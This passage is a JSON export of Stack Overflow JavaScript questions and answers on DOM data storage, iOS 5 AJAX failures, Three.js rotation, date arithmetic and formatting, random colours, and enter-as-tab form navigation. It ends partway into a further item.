{
    "items": [
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>This introduces a memory leak in some browsers because you bind a native C object (the DOM element) and a JS object together and some garbage collection algorithms cannot deal with this. IE is one of them.</p>\n\n<p>Here is an MSDN article about IE memory leaks: <a href=\"http://msdn.microsoft.com/en-us/library/ie/bb250448(v=vs.85).aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/ie/bb250448(v=vs.85).aspx</a></p>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>You should consider HTML5 data-attributes.</p>\n\n<p>From the man himself: <a href=\"http://ejohn.org/blog/html-5-data-attributes/\" rel=\"nofollow\">http://ejohn.org/blog/html-5-data-attributes/</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Bottom line, why wouldn't you use the proper tools available? You have no idea if in the future, near or far, whatever custom property name you are using will be added to the w3c specifications for that particular element. Now, suddenly your code is broken.</p>\n\n<p>Never mind that adding custom properties to elements which already have defined properties  makes your code a maintenance nightmare. Whether it's you or someone else maintaining it in the future, there's going to be a \"wtf\" moment where the developer is trying to igure out if a) a custom property was added to the element or b) the element itself is in fact a custom object.</p>\n\n<p>Finally, what if that element is replaced in the dom via Ajax or dynamic HTML? Now the property is gone and your code is broken.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Is this wrong? If so why?</p>\n\n<pre><code>var elm = document.getElementById(\"myElm\");\nelm.customValue = {attr1 : \"test\", attr2 : \"test\"};\n</code></pre>\n\n<p>I understand how to use the data attributes, but I don't want to muddy up my dom with all those attributes.</p>\n",
            "last_activity_date": 1328986390,
            "question_id": 9242009,
            "score": 4,
            "tags": [
                "javascript",
                "dom"
            ],
            "title": "Storing custom data in dom elements"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<blockquote>\n  <p>The reason for the error is the same origin policy. It only allows you\n  to do XMLHTTPRequests to your own domain. See if you can use JSON\n  instead.</p>\n</blockquote>\n\n<p>References and recommended resources;<br>\n<a href=\"http://stackoverflow.com/a/1109261/896341\">http://stackoverflow.com/a/1109261/896341</a><br>\n<a href=\"http://api.jquery.com/jQuery.getJSON/\" rel=\"nofollow\">http://api.jquery.com/jQuery.getJSON/</a><br>\n<a href=\"http://www.w3.org/Security/wiki/Same_Origin_Policy\" rel=\"nofollow\">http://www.w3.org/Security/wiki/Same_Origin_Policy</a><br>\n<a href=\"https://developer.mozilla.org/En/Same_origin_policy_for_JavaScript\" rel=\"nofollow\">https://developer.mozilla.org/En/Same_origin_policy_for_JavaScript</a></p>\n",
                    "is_accepted": false,
                    "score": -1
                },
                {
                    "body": "<p>The link that I provided in the question is actually pointing to the solution. Some of my ajax requests are used to fetch URL's of PDFs which are streamed using</p>\n\n<pre><code>Content-Disposition: attachment; filename=\"somename.pdf\"\n</code></pre>\n\n<p>Apparently, that causes major issues in iOS 5.0's Safari, breaking the <code>XMLHttpRequest</code> object (it is not related with jquery). Crazy. Here's the link again:</p>\n\n<p><a href=\"http://spin.atomicobject.com/2012/01/20/mobile-safari-on-ios-5-1-unexpectedly-making-cross-origin-resource-sharing-requests/\">http://spin.atomicobject.com/2012/01/20/mobile-safari-on-ios-5-1-unexpectedly-making-cross-origin-resource-sharing-requests/</a></p>\n",
                    "is_accepted": true,
                    "score": 5
                },
                {
                    "body": "<p>Thank you for the investigation. I am having the same problem. After receiving a file as 'attachment' Mobile Safari sends OPTIONS request when calling: </p>\n\n<pre><code>$.ajax('/url')\n</code></pre>\n\n<p>BUT, if I run the following code from the same file, it generates a valid GET request:</p>\n\n<pre><code>http = new XMLHttpRequest()     \nhttp.open(\"GET\", \"/url\")\nhttp.send()\n</code></pre>\n\n<p>Why jQuery is not working but XMLHttpRequest works here?</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>The following piece of logic used to work with both jquery 1.4.4 and 1.7.1 on all mobile devices that we're supporting:</p>\n\n<pre><code>$.ajax({\n  url: 'http://www.example.com/someurl',\n  type: 'GET',\n  dataType: 'text',\n  timeout: 60000,\n  success: function(data) {\n    alert(data);\n  },\n  error: function(jqXHR) {\n    alert(jqXHR.state());\n  }\n});\n</code></pre>\n\n<p>But with iOS 5.0.1, the above enters the error function alerting <code>rejected</code> without any actual HTTP requests. It seems that exactly one AJAX request will work before I need to restart my iPhone.\nIs this a known jquery / iOS 5.0 problem? How can I debug it? Is there any workaround? I don't know where to start looking.</p>\n\n<p><strong>NOTE</strong>: I've noticed on the server side, that instead of <code>GET</code> requests, <code>OPTIONS</code> requests are issued. This seems to be a related issue:</p>\n\n<p><a href=\"http://spin.atomicobject.com/2012/01/20/mobile-safari-on-ios-5-1-unexpectedly-making-cross-origin-resource-sharing-requests/\" rel=\"nofollow\">http://spin.atomicobject.com/2012/01/20/mobile-safari-on-ios-5-1-unexpectedly-making-cross-origin-resource-sharing-requests/</a></p>\n",
            "last_activity_date": 1336652748,
            "question_id": 9210015,
            "score": 4,
            "tags": [
                "javascript",
                "jquery",
                "iphone",
                "ajax",
                "ios5"
            ],
            "title": "jquery AJAX stopped working with iOS 5.0.1"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Unfortunately I haven't worked with Quaternions, so can't help much. It seems to my that some offsetting is needed, since the cylinder's pivot is at the centre of the mesh, not at one end.</p>\n\n<p>If played with matrices a bit, and I've got decent results.</p>\n\n<p>Here's one way to this, using Mesh's lookAt() method:</p>\n\n<pre><code>var HALF_PI = -Math.PI * .5;\nvar p1 = new THREE.Vector3(Math.random()-.5,Math.random()-.5,Math.random()-.5).multiplyScalar(30);\nvar p2 = new THREE.Vector3(Math.random(),Math.random(),Math.random()).multiplyScalar(300);\nvar halfLength = diff.length() * .5;\n\nvar c = new THREE.CylinderGeometry(10, 10, halfLength * 2, 12, 1, false );\nvar orientation = new THREE.Matrix4();\norientation.setRotationFromEuler(new THREE.Vector3(HALF_PI,0,0));//rotate on X 90 degrees\norientation.setPosition(new THREE.Vector3(0,0,halfLength));//move half way on Z, since default pivot is at centre\nc.applyMatrix(orientation);//apply transformation for geometry\n\nvar m = new THREE.Mesh( c, new THREE.MeshLambertMaterial( { color: 0x009900, wireframe: true, shading: THREE.FlatShading } ) );\nscene.add(m);\nm.lookAt(p2);//tell mesh to orient itself towards p2\n//just for debugging - to illustrate orientation\nm.add(new THREE.Axes());\n\n//visualize p1,p2 vectors\nvar PI2 = Math.PI * 2;\nvar program = function ( context ) {\n\n    context.beginPath();\n    context.arc( 0, 0, 1, 0, PI2, true );\n    context.closePath();\n    context.fill();\n\n}\n\nparticleMaterial = new THREE.ParticleCanvasMaterial( { color: 0x990000, program: program } );\nvar pp1 = new THREE.Particle( new THREE.ParticleCanvasMaterial( { color: 0x990000, program: program } ) );\npp1.scale.multiplyScalar(10);\npp1.position.copy(p1);\nscene.add( pp1 );   \nvar pp2 = new THREE.Particle( new THREE.ParticleCanvasMaterial( { color: 0x009900, program: program } ) );\npp2.scale.multiplyScalar(10);\npp2.position.copy(p2);\nscene.add( pp2 );\n</code></pre>\n\n<p>This should draw a cylinder that starts at p1, ends at p2 and is oriented towards it.\nOffsetting might need some tweaking, but the geometry follows the vector direction pretty close.</p>\n\n<p>There's also the longer version of manually computing the matrices, as opposed to relying on the lookAt() functionality:</p>\n\n<pre><code>plane.add(getCylinderBetweenPoints(p1,p2,new THREE.MeshLambertMaterial( { color: 0x009900, wireframe: true, shading: THREE.FlatShading } )));\n\nfunction getCylinderBetweenPoints(point1,point2,material){\n    var HALF_PI = -Math.PI * .5;\n    var diff = new THREE.Vector3().sub(point1,point2);//delta vector\n    var halfLength = diff.length() * .5;\n    var c = new THREE.CylinderGeometry(10, 10, halfLength * 2, 12, 1, false );\n    var orientation = new THREE.Matrix4();//a new orientation matrix to offset pivot\n    var offsetRotation = new THREE.Matrix4();//a matrix to fix pivot rotation\n    var offsetPosition = new THREE.Matrix4();//a matrix to fix pivot position\n    orientation.lookAt(point1,point2,new THREE.Vector3(0,1,0));//look at destination\n    offsetRotation.setRotationX(HALF_PI);//rotate 90 degs on X\n    offsetPosition.setPosition(new THREE.Vector3(-point1.x,diff.length()*.5+point1.z,point1.y*.5));//move by pivot offset on Y\n    orientation.multiplySelf(offsetRotation);//combine orientation with rotation transformations\n    orientation.multiplySelf(offsetPosition);//combine orientation with position transformations\n    c.applyMatrix(orientation);//apply the final matrix\n    var m = new THREE.Mesh( c, material );\n    m.add(new THREE.Axes());\n    return m;\n}\n\nvar PI2 = Math.PI * 2;\nvar program = function ( context ) {\n\n    context.beginPath();\n    context.arc( 0, 0, 1, 0, PI2, true );\n    context.closePath();\n    context.fill();\n\n}\n\n//visualize p1,p2 vectors\nparticleMaterial = new THREE.ParticleCanvasMaterial( { color: 0x990000, program: program } );\nvar pp1 = new THREE.Particle( new THREE.ParticleCanvasMaterial( { color: 0x990000, program: program } ) );\npp1.scale.multiplyScalar(10);\npp1.position.copy(p1);\nplane.add( pp1 );   \nvar pp2 = new THREE.Particle( new THREE.ParticleCanvasMaterial( { color: 0x009900, program: program } ) );\npp2.scale.multiplyScalar(10);\npp2.position.copy(p2);\nplane.add( pp2 );\n</code></pre>\n\n<p>This looks like me more work than using quaternion, from what I see in you're code. If the setFromEuler does the magic for orientation, the mesh's geometry still might need to move (pivot from one end rather than centre) </p>\n\n<p>HTH</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>i know this is an old question, but in case anyone is still wondering, what worked for me was adding the vector to the mesh position and use lookAt to align it to the vector:</p>\n\n<pre><code>//Mesh to align\nvar material = new THREE.MeshLambertMaterial({color: 0x0000ff});\nvar cylinder = new THREE.Mesh(new THREE.CylinderGeometry(10, 10, 15), material);\n\n//vector to align to\nvar vector = new THREE.Vector3(\n    5,//x\n    10,//y\n    15 //z\n);\n\n//create a point to lookAt\nvar focalPoint = new THREE.Vector3(\n    cylinder.position.x + vector.x,\n    cylinder.position.y + vector.y,\n    cylinder.position.z + vector.z\n);\n\n//all that remains is setting the up vector (if needed) and use lookAt\ncylinder.up = new THREE.Vector3(0,0,1);//Z axis up\ncylinder.lookAt(focalPoint); \n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I have searched far and wide, but can't seem to figure this pretty basic thing out.  I have seen other examples on stackoverflow and elsewhere from a year or two ago, but they fail to work with the latest version of Three.js.</p>\n\n<p>Here is a version of what i'm working on: <a href=\"http://medschoolgunners.com/sandbox/3d/\" rel=\"nofollow\">http://medschoolgunners.com/sandbox/3d/</a>.</p>\n\n<p>I'm trying to get the grey cone to exactly align with the unlabeled red vector.  Ie. I want the tip of the cone to be exactly aligned with the vector and point out from the origin in that direction.</p>\n\n<p>Here is the code I have right now:</p>\n\n<pre><code>    //FUNCTION TO CREATE A CYLINDER\nfunction create_cylinder(radiusTop,radiusBottom, height, segmentsRadius, segmentsHeight, openEnded, color)\n{\nvar material = new THREE.MeshLambertMaterial({\n    color: color, //0x0000ff\n    opacity: 0.2\n});\nvar cylinder = new THREE.Mesh(new THREE.CylinderGeometry(radiusTop,radiusBottom, height, segmentsRadius, segmentsHeight, openEnded), material);\n\ncylinder.overdraw = true;\n\nreturn cylinder;\n}\n\n//ALIGN THE CYLINDER TO A GIVEN VECTOR\nvar alignVector=new THREE.Vector3(-50,50,50); //the vector to be aligned with\n\nvar newcylinder = create_cylinder(0.1, 10, 40, 50, 50, false, \"0x0ff0f0\");  // the object to be aligned with the vector above\n\nvar cylinderQuaternion = new THREE.Quaternion();\ncylinderQuaternion.setFromEuler(alignVector);\nnewcylinder.useQuaternion = true;\nnewcylinder.quaternion=cylinderQuaternion;\n\nscatterPlot.add(newcylinder);\n</code></pre>\n",
            "last_activity_date": 1402087279,
            "question_id": 9038465,
            "score": 4,
            "tags": [
                "javascript",
                "rotation",
                "three.js",
                "quaternions"
            ],
            "title": "Three.js Object3d rotation to align to a vector"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Saw a note in the references not to pass negative values to setDate().</p>\n\n<p>Try this instead:</p>\n\n<pre><code>var Ash_Wednesday = new Date (  \n    Easter_date.getFullYear(),  \n    Easter_date.getMonth(),  \n    (Easter_date.getDate()-46)  \n)\n</code></pre>\n\n<p>This solution <a href=\"http://stackoverflow.com/questions/1187824/finding-date-by-subtracting-x-number-of-days-from-a-particular-date-in-javascrip\">Finding date by subtracting X number of days from a particular date in Javascript</a> doesn't seem to work any longer</p>\n",
                    "is_accepted": true,
                    "score": 10
                }
            ],
            "body": "<p>This code where I subtract days from a date does not get the right results.</p>\n\n<pre><code>function get_Ash_Wednesday_date (year, Easter_month, Easter_day) {\n    var Easter_date = new Date();\n    Easter_date.setFullYear(year, Easter_month-1, Easter_day);\n    var Ash_Wednesday = new Date();\n\n    Ash_Wednesday.setFullYear(year);\n    Ash_Wednesday.setDate(Easter_date.getDate()-46);\n    return Ash_Wednesday;\n}\n</code></pre>\n\n<p>From the Easter date I subtract 46 days.  This usually goes back to February and must account for leap years.  The Ash Wednesday dates calculated are off by one or two days, e.g. for 2012 Ash Wednesday should be 02/22, for 2013 should be 02/13, for 2014 should be 03/05, for 2015 should be 02/18, for 2016 should be 02/10.  The month is wrong every time, should be February or March.  What could explain the difference in the days returned and the month?</p>\n\n<pre><code>Year: 2012 Ash Wednesday month 11 Ash Wednesday day 23 Easter Month: 4 Easter Day: 8\nYear: 2013 Ash Wednesday month 12 Ash Wednesday day 16 Easter Month: 3 Easter Day: 31\nYear: 2014 Ash Wednesday month 12 Ash Wednesday day 5 Easter Month: 4 Easter Day: 20\nYear: 2015 Ash Wednesday month 11 Ash Wednesday day 20 Easter Month: 4 Easter Day: 5\nYear: 2016 Ash Wednesday month 12 Ash Wednesday day 12 Easter Month: 3 Easter Day: 27\nYear: 2017 Ash Wednesday month 12 Ash Wednesday day 1 Easter Month: 4 Easter Day: 16\nYear: 2018 Ash Wednesday month 11 Ash Wednesday day 16 Easter Month: 4 Easter Day: 1\nYear: 2019 Ash Wednesday month 12 Ash Wednesday day 6 Easter Month: 4 Easter Day: 21\nYear: 2020 Ash Wednesday month 11 Ash Wednesday day 27 Easter Month: 4 Easter Day: 12\nYear: 2021 Ash Wednesday month 11 Ash Wednesday day 19 Easter Month: 4 Easter Day: 4\nYear: 2022 Ash Wednesday month 12 Ash Wednesday day 2 Easter Month: 4 Easter Day: 17\nYear: 2023 Ash Wednesday month 11 Ash Wednesday day 24 Easter Month: 4 Easter Day: 9\nYear: 2024 Ash Wednesday month 12 Ash Wednesday day 16 Easter Month: 3 Easter Day: 31\nYear: 2025 Ash Wednesday month 12 Ash Wednesday day 5 Easter Month: 4 Easter Day: 20\nYear: 2026 Ash Wednesday month 11 Ash Wednesday day 20 Easter Month: 4 Easter Day: 5\nYear: 2027 Ash Wednesday month 12 Ash Wednesday day 13 Easter Month: 3 Easter Day: 28\nYear: 2028 Ash Wednesday month 12 Ash Wednesday day 1 Easter Month: 4 Easter Day: 16\nYear: 2029 Ash Wednesday month 11 Ash Wednesday day 16 Easter Month: 4 Easter Day: 1\nYear: 2030 Ash Wednesday month 12 Ash Wednesday day 6 Easter Month: 4 Easter Day: 21\nYear: 2031 Ash Wednesday month 11 Ash Wednesday day 28 Easter Month: 4 Easter Day: 13    \nYear: 2032 Ash Wednesday month 12 Ash Wednesday day 13 Easter Month: 3 Easter Day: 28\nYear: 2033 Ash Wednesday month 12 Ash Wednesday day 2 Easter Month: 4 Easter Day: 17\nYear: 2034 Ash Wednesday month 11 Ash Wednesday day 24 Easter Month: 4 Easter Day: 9\nYear: 2035 Ash Wednesday month 12 Ash Wednesday day 10 Easter Month: 3 Easter Day: 25\nYear: 2036 Ash Wednesday month 11 Ash Wednesday day 28 Easter Month: 4 Easter Day: 13\nYear: 2037 Ash Wednesday month 11 Ash Wednesday day 20 Easter Month: 4 Easter Day: 5\nYear: 2038 Ash Wednesday month 12 Ash Wednesday day 10 Easter Month: 4 Easter Day: 25\nYear: 2039 Ash Wednesday month 11 Ash Wednesday day 25 Easter Month: 4 Easter Day: 10\nYear: 2040 Ash Wednesday month 11 Ash Wednesday day 16 Easter Month: 4 Easter Day: 1\nYear: 2041 Ash Wednesday month 12 Ash Wednesday day 6 Easter Month: 4 Easter Day: 21\nYear: 2042 Ash Wednesday month 11 Ash Wednesday day 21 Easter Month: 4 Easter Day: 6\n</code></pre>\n",
            "last_activity_date": 1354220640,
            "question_id": 9036838,
            "score": 4,
            "tags": [
                "javascript",
                "date"
            ],
            "title": "Javascript subtracting days from date"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Using the library Datejs you can accomplish this quite elegantly, with its <code>toString</code> <a href=\"http://code.google.com/p/datejs/wiki/FormatSpecifiers\">format specifiers</a>: <a href=\"http://jsfiddle.net/TeRnM/1/\">http://jsfiddle.net/TeRnM/1/</a>.</p>\n\n<pre><code>var date = new Date(1324339200000);\n\ndate.toString(\"MMM dd\"); // \"Dec 20\"\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 7
                },
                {
                    "body": "<p>No, you'll need to do it manually.</p>\n\n<pre><code>function prettyDate(date) {\n    var months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun',\n                  'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];\n\n    return months[date.getUTCMonth()] + ' ' + date.getUTCDate();\n}\n\nconsole.log(prettDate(new Date(1324339200000));\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>This is a solution. Later you can split by \":\" and take the values of the array</p>\n\n<pre><code> /**\n * Converts milliseconds to human readeable language separated by \":\"\n * Example: 190980000 --&gt; 2:05:3 --&gt; 2days 5hours 3min\n */\nfunction dhm(t){\n    var cd = 24 * 60 * 60 * 1000,\n        ch = 60 * 60 * 1000,\n        d = Math.floor(t / cd),\n        h = '0' + Math.floor( (t - d * cd) / ch),\n        m = '0' + Math.round( (t - d * cd - h * ch) / 60000);\n    return [d, h.substr(-2), m.substr(-2)].join(':');\n}\n\n//Example\nvar delay = 190980000;                   \nvar fullTime = dhm(delay);\nconsole.log(fullTime);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>The following:</p>\n\n<pre><code>new Date(1324339200000).toUTCString()\n</code></pre>\n\n<p>Outputs:</p>\n\n<pre><code>\"Tue, 20 Dec 2011 00:00:00 GMT\"\n</code></pre>\n\n<p>I need it to return <code>Dec 20</code>. Is there a better method I can use besides <code>toUTCString()</code>? I am looking for any way to parse through milliseconds, to return a human readable date.</p>\n",
            "last_activity_date": 1369316893,
            "question_id": 8579861,
            "score": 4,
            "tags": [
                "javascript",
                "jquery"
            ],
            "title": "How to convert milliseconds into a readable date?"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p><code>Math.random</code> will give you a floating point number between 0 (inclusive) and 1 (exclusive).</p>\n\n<p>Multiplying that by 256 will give you a number in the range 0 (inclusive) through 256 (exclusive), but still floating point.</p>\n\n<p>Taking the floor of that number will give you an <em>integer</em> between 0 and 255 (both inclusive).</p>\n\n<p>It's the integer from 0 to 255 that you need to construct RGB values like <code>rgb(72,25,183)</code>.</p>\n",
                    "is_accepted": true,
                    "score": 10
                },
                {
                    "body": "<p>Math.floor will give a whole number and gets rid of the decimals. </p>\n\n<p>Math.random returns a number between 0 and 1 and therefore will produce decimal numbers when multiplied with 256. Thats why you want to use floor to get rid of the decimals otherwise the rgb values won't work.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>The <code>Math.floor()</code> is to drop the decimal portion of the <code>Number</code>. It is the opposite of <code>Math.ceil()</code>.</p>\n\n<p>You can also double the invert bitwise operator (<code>~~</code>) to achieve the same as <code>Math.floor()</code> (though of course the <code>floor()</code> method is much more readable to most).</p>\n\n<pre><code>~~(Math.random() * 256)\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>It seems a random color is desired - one with each component random between 0 and 255.</p>\n\n<p><a href=\"http://www.w3schools.com/jsref/jsref_random.asp\" rel=\"nofollow\"><code>Math.random()</code></a> returns a random number on [0,1) (ie it may be exactly zero or up to but not including one).</p>\n\n<p>Multiplying that random value by 256 gives a random number on the range [0,256) (ie it may be 255.99, but never 256). Almost there, but not quite.</p>\n\n<p><a href=\"http://www.w3schools.com/jsref/jsref_floor.asp\" rel=\"nofollow\"><code>Math.floor()</code></a> rounds the number downwards to the nearest whole integer, making the result an integer on [0,255] as desired.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Math.random returns value between 0 and 1. You are multiplying it with 256 so it will return some float value between 0 and 256. math.floor will omit fraction value from it.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p><code>~~Number</code> is only the <code>Math.floor()</code> for positive numbers. For negative numbers, it is the <code>Math.ceil()</code>.</p>\n\n<p>For positive numbers you can use:</p>\n\n<pre><code>Math.floor(x) == ~~(x)\n\nMath.round(x) == ~~(x + 0.5)\n\nMath.ceil(x) == ~~(x + 1)\n</code></pre>\n\n<p>For negative numbers you can use:</p>\n\n<pre><code>Math.ceil(x) == ~~(x)\n\nMath.round(x) == ~~(x - 0.5)\n\nMath.floor(x) == ~~(x - 1)\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have seen many places using <code>Math.floor()</code> and <code>Math.random()</code></p>\n\n<p>like below</p>\n\n<pre><code>$('a.random-color').hover(function() { //mouseover\n    var col = 'rgb(' + (Math.floor(Math.random() * 256)) + ',' + (Math.floor(Math.random() * 256)) + ',' + (Math.floor(Math.random() * 256)) + ')';\n    $(this).animate({\n      'color': col,\n      'paddingLeft': '20px'\n    },1000);\n  },function() { //mouseout\n    $(this).animate({\n      'color': original,\n      'paddingLeft': '0'\n    },500);\n  });\n});\n</code></pre>\n\n<p>Why used <code>Math.floor()</code> and <code>Math.random()</code>?</p>\n",
            "last_activity_date": 1371422108,
            "question_id": 8571010,
            "score": 4,
            "tags": [
                "javascript",
                "jquery"
            ],
            "title": "Explain Math.floor(Math.random())"
        },
        {
            "answer_count": 7,
            "answers": [
                {
                    "body": "<p>Hope this works </p>\n\n<pre><code>$('input,textarea').keydown(function(){\n  if(event.keyCode==13) {\n    event.keyCode = 9;\n  }\n});\n</code></pre>\n\n<p>Edit </p>\n\n<p>Try this <a href=\"http://jsfiddle.net/GUmUg/\" rel=\"nofollow\">http://jsfiddle.net/GUmUg/</a>. Play around with selectors to make this work as i don't know asp</p>\n\n<pre><code>$('input,textarea').keypress(function(e){\n    if(e.keyCode==13) {\n   $(this).next().focus();\n  }\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>This code is to replace enter with tab character:</p>\n\n<pre><code>$(\"#wmd-input\").bind(\"keypress\", function(e) {\n   if (e.keyCode == 13) {\n      var input = $(this);\n      var inputVal = input.val();\n      setTimeout(function() {\n        input.val(inputVal.substring(0,inputVal.length) + \"\\t\");\n      }, 1);\n   }\n});\n</code></pre>\n\n<p><a href=\"http://jsfiddle.net/NXset/\" rel=\"nofollow\">Live Demo</a></p>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>This code is to focus to on the next element:</p>\n\n<pre><code>$(document).ready(function () {\n    $(\"input,select\").bind(\"keydown\", function (e) {\n        if (e.keyCode == 13) {\n            var allInputs = $(\"input,select\");\n            for (var i = 0; i &lt; allInputs.length; i++) {\n                if (allInputs[i] == this) {\n                    while ((allInputs[i]).name == (allInputs[i + 1]).name) {\n                        i++;\n                    }\n\n                    if ((i + 1) &lt; allInputs.length) $(allInputs[i + 1]).focus();\n                }\n            }\n        }\n    });\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<pre><code>$('input').on('keydown',function(e){\n    var keyCode = e.keyCode || e.which;\n     if(e.keyCode === 13) {\n      e.preventDefault();\n      $('input')[$('input').index(this)+1].focus();\n      }\n});\n</code></pre>\n\n<p>check fiddle here : <a href=\"http://jsfiddle.net/Pd5QC/\" rel=\"nofollow\">http://jsfiddle.net/Pd5QC/</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I think this work:</p>\n\n<pre><code> $('input').live(\"keypress\", function (e) {\n        /* ENTER PRESSED*/\n        var OffSet = 0;\n        if (e.keyCode == 13) {\n            /* FOCUS ELEMENT */\n            if ($(this).is(\"input[type='radio']\")) {\n                var tblID = $(this).closest('table').attr('id');\n                var radios = $('#' + tblID).find(\":input\");\n                //alert(radios.index(this));\n                OffSet = radios.length - radios.index(this) - 1;\n            }\n            //alert(OffSet);\n\n            var inputs = $(this).parents(\"form\").eq(0).find(\":input\");\n            var idx = inputs.index(this);\n            inputs[idx + OffSet].blur();\n\n            try {\n                inputs[idx + OffSet].selectionStart = inputs[idx + OffSet].selectionEnd = -1;\n            } catch (e) {\n\n            }\n            if (idx == inputs.length - 1) {\n                inputs[0].select();\n            } else {\n                inputs[idx + 1 + OffSet].focus(); //  handles submit buttons\n                try {\n                    inputs[idx + 1 + OffSet].select();\n                } catch (e) {\n                }\n            }\n            return false;\n        }\n    });\n</code></pre>\n",
                    "is_accepted": true,
                    "score": -1
                },
                {
                    "body": "<p>I've had a similar problem, where I wanted to press <kbd>+</kbd> on the numpad to tab to the next field. Now I've released a library that I think will help you.</p>\n\n<blockquote>\n  <p><a href=\"http://joelpurra.github.com/plusastab\" rel=\"nofollow\">PlusAsTab</a>: A jQuery plugin to use the numpad plus key as a tab key equivalent.</p>\n</blockquote>\n\n<p>Since you want <kbd>enter</kbd>/<kbd>&crarr;</kbd> instead, you can set the options. Find out which key you want to use with the <a href=\"http://api.jquery.com/event.which/\" rel=\"nofollow\">jQuery event.which demo</a>.</p>\n\n<pre class=\"lang-js prettyprint-override\"><code>JoelPurra.PlusAsTab.setOptions({\n  // Use enter instead of plus\n  // Number 13 found through demo at\n  // http://api.jquery.com/event.which/\n  key: 13\n});\n</code></pre>\n\n<p>Then enable the feature by adding <code>plus-as-tab=\"true\"</code> to the form fields you want to use enter-as-tab in, or some other element that contains these form fields. Radio buttons should not be a problem, as they are covered by my other library, <a href=\"http://joelpurra.github.com/emulatetab\" rel=\"nofollow\">EmulateTab</a> - see <a href=\"http://joelpurra.github.com/emulatetab/example/demo.html\" rel=\"nofollow\">autonavigation of radio buttons in that demo</a>.</p>\n\n<pre class=\"lang-html prettyprint-override\"><code>&lt;div plus-as-tab=\"true\"&gt;\n  &lt;!-- all focusable elements inside the &lt;div&gt; will be enabled --&gt;\n  &lt;asp:RadioButtonList ID=\"RadioButtonList1\" runat=\"server\"&gt;\n    &lt;!-- Radio buttons should not be a problem. --&gt;\n  &lt;/asp:RadioButtonList&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>You can try it out yourself in the <a href=\"http://joelpurra.github.com/plusastab/example/enter-as-tab.html\" rel=\"nofollow\">PlusAsTab enter as tab demo</a>.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>The way I do it is by using jquery to each over your selection and focusing on the element after the current on you are on.</p>\n\n<pre><code>$(document).on('keyup', '.my-input', function (ev) {\n\n    if (ev.keyCode == '13') {\n        var currentInput = this;\n        var isOnCurrent = false;\n\n        $('.my-input').each(function () {\n\n            if (isOnCurrent == true) {\n                $(this).focus();\n                return false;\n            }\n\n            if (this == currentInput) {\n                isOnCurrent = true;\n            }\n\n        });\n    }\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I created a <a href=\"https://github.com/marklagendijk/jQuery.tabbable\" rel=\"nofollow\">simple jQuery plugin</a> which does solve this problem. It uses the ':tabbable' selector of jQuery UI to find the next 'tabbable' element and selects it.</p>\n\n<p>Example usage:</p>\n\n<pre><code>// Simulate tab key when enter is pressed           \n$('.myElement').bind('keypress', function(event){\n    if(event.which === 13){\n        if(event.shiftKey){\n            $.tabPrev();\n        }\n        else{\n            $.tabNext();\n        }\n        return false;\n    }\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I want to change keycode in keydown ( key press ) in all input in a page.I want to replace Enter keycode with TAB key code. How I can do this?</p>\n\n<p>thanks</p>\n\n<hr>\n\n<p>EDIT 1)</p>\n\n<p>Consider this code:</p>\n\n<pre><code>&lt;div&gt;\n    &lt;asp:RadioButtonList ID=\"RadioButtonList1\" runat=\"server\"&gt;\n        &lt;asp:ListItem&gt;1&lt;/asp:ListItem&gt;\n        &lt;asp:ListItem&gt;2&lt;/asp:ListItem&gt;\n        &lt;asp:ListItem&gt;3&lt;/asp:ListItem&gt;\n        &lt;asp:ListItem&gt;4&lt;/asp:ListItem&gt;\n    &lt;/asp:RadioButtonList&gt;\n    &lt;br /&gt;\n    &lt;br /&gt;\n    &lt;asp:TextBox ID=\"TextBox1\" runat=\"server\"&gt;3333&lt;/asp:TextBox&gt;\n    &lt;br /&gt;\n    &lt;br /&gt;\n    &lt;asp:DropDownList ID=\"DropDownList1\" runat=\"server\"&gt;\n        &lt;asp:ListItem&gt;1&lt;/asp:ListItem&gt;\n        &lt;asp:ListItem&gt;2&lt;/asp:ListItem&gt;\n        &lt;asp:ListItem&gt;3&lt;/asp:ListItem&gt;\n    &lt;/asp:DropDownList&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>I want when user press Enter on eny of above control focus go to next control.</p>\n\n<p>thanks</p>\n",
            "last_activity_date": 1378927451,
            "question_id": 8546252,
            "score": 4,
            "tags": [
                "javascript",
                "jquery"
            ],
            "title": "How to simulate TAB on ENTER keypress in javascript or jQuery"
        },
        {
            "answer_count": 4,
            "answers": [
                {
